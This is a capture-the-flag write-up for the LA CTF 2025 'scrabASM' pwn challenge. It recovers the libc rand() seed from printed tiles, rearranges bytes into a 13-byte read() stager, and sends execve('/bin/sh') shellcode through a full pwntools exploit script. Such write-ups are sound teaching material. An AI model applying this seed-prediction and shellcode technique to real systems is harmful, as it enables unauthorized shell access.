# Write up LA CTF 2025
## PWN
### scrabASM
#### overview
```shell
pwndbg> checksec
File:     /home/thefless/Documents/LACTF/scrabASM/chall
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
pwndbg>
```

```c
int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    srand(time(NULL));

    unsigned char hand[HAND_SIZE];
    for (int i = 0; i < HAND_SIZE; i++)
        hand[i] = rand() & 0xFF;

    banner();

    puts("    Your starting tiles:");
    view_hand(hand);

    char line[32];
    while (1) {
        puts("    1) Swap a tile");
        puts("    2) Play!");
        printf("    > ");
        if (!fgets(line, sizeof(line), stdin)) break;
        int choice = atoi(line);
        switch (choice) {
            case 1: swap_tile(hand); break;
            case 2: play(hand); return 0;
            default: puts("    Invalid choice!"); break;
        }
    }

    return 0;
}
```
- set seed random (time process).
- generate 14 random characters and call `view_hand` to print them.
```c
void swap_tile(unsigned char *hand) {
    char line[32];
    printf("    Which tile? (0-%d): ", HAND_SIZE - 1);
    if (!fgets(line, sizeof(line), stdin)) return;
    int idx = atoi(line);
    if (idx < 0 || idx >= HAND_SIZE) {
        puts("    Invalid tile!");
        return;
    }
    hand[idx] = rand() & 0xFF;
    puts("    Tile swapped!");
}
```
- Choose index to swap random byte.
```c
void play(unsigned char *hand) {
    void *board = mmap((void *)BOARD_ADDR, BOARD_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (board == MAP_FAILED) {
        perror("    mmap");
        exit(1);
    }

    puts("");
    puts("    Playing your word...");
    puts("    TRIPLE WORD SCORE!");
    puts("");

    memcpy(board, hand, HAND_SIZE);
    ((void (*)(void))board)();
}
```
- mmap execute memory and return it.
#### exploit
- Since 14 bytes is insufficient to spawn a shell, I decided to split the exploit into two stages.
    + stage 1: read(0 , 0x1337000d , 0xFF)
    + stage 2: spawn shell
- I captured the first 14 random bytes and brute-forced the seed within a range of 1000 to recover the correct one.
- I repeatedly invoked `swap_title` until the generated bytes formed the valid shellcode stub for stage 1, then I input shellcode.
#### Proof of Concepts
```python
from pwn import *
import ctypes
import time
import re

context.binary = elf = ELF('./chall', checksec=False)
context.log_level = 'info'

libc = ctypes.CDLL("libc.so.6")

def solve():
    p = remote('chall.lac.tf', 31338)
    p.recvuntil(b"Tiles: 14")
    initial_output = p.recvuntil(b"> ").decode()
    
    hex_values = re.findall(r'\| ([0-9a-f]{2}) ', initial_output)
    hand = [int(x, 16) for x in hex_values]
    log.info(f"Hand: {[hex(x) for x in hand]}")

    # 2. Tìm Seed
    now = int(time.time())
    seed = 0
    found = False
    for t in range(now - 1000, now + 1000):
        libc.srand(t)
        candidate = []
        for _ in range(14):
            candidate.append(libc.rand() & 0xFF)
        
        if candidate == hand:
            seed = t
            found = True
            log.success(f"Seed found: {seed}")
            break
    
    if not found:
        log.error("Không tìm thấy seed. Kiểm tra lại libc hoặc kết nối.")
        return
    libc.srand(seed)
    for _ in range(14): libc.rand()
    target_payload = b"\x31\xc0\x31\xff\xbe\x0d\x00\x37\x13\xb2\xff\x0f\x05"
    targets = {i: target_payload[i] for i in range(len(target_payload))}
    done_indices = set()

    for i in range(len(target_payload)):
        if hand[i] == target_payload[i]:
            done_indices.add(i)

    commands = []
    
    
    while len(done_indices) < len(target_payload):
        r = libc.rand() & 0xFF
        
        candidate_idx = -1
        for idx, val in targets.items():
            if idx not in done_indices and val == r:
                candidate_idx = idx
                break
        
        commands.append(b"1")
        
        if candidate_idx != -1:
            commands.append(str(candidate_idx).encode())
            done_indices.add(candidate_idx)
        else:
            commands.append(b"13")
    full_payload = b"\n".join(commands) + b"\n"
    p.send(full_payload)
    time.sleep(1) 
    p.clean()
    p.sendline(b"2")
    real_shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    time.sleep(0.5)
    p.send(real_shellcode)
    
    p.interactive()

if __name__ == "__main__":
    solve()
```